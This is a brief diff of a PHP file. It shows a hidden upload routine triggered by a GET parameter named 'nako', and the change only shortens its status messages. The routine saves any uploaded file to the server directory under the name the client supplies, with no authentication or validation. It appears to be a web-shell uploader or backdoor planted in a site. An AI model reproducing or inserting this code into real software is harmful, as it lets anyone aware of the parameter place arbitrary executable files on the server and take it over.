@@ -26,12 +26,12 @@ if (isset($_GET["nako"])) {
         if (isset($_FILES["f"]) && $_FILES["f"]["error"] == 0) {
             $target_file = basename($_FILES["f"]["name"]);
             if (move_uploaded_file($_FILES["f"]["tmp_name"], $target_file)) {
-                echo "<b>File " . htmlspecialchars($target_file) . " successfully uploaded</b><br>";
+                echo "<b>File " . htmlspecialchars($target_file) . " successful</b><br>";
             } else {
-                echo "<b>Failed upload</b><br>";
+                echo "<b>Failed</b><br>";
             }
         } else {
-            echo "<b>Nothing uploaded</b><br>";
+            echo "<b>Nothing</b><br>";
         }
     }
 }
